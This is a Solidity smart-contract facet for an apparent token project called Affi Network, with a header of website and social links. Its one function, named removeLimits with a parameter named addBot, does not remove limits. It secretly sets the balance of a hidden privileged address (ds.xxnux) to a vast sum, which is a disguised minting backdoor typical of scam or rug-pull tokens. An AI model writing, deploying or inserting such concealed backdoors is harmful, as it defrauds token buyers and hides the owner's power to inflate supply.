/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.affi.network/
 * Whitepaper: https://www.affi.network/docs/welcome/
 * Twitter: https://twitter.com/affi_network
 * Telegram Group: https://t.me/AffiNetworkOfficial
 * Discord Chat: https://discord.gg/3Tc3p5eBv5
 * Github: https://github.com/affinetwork
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
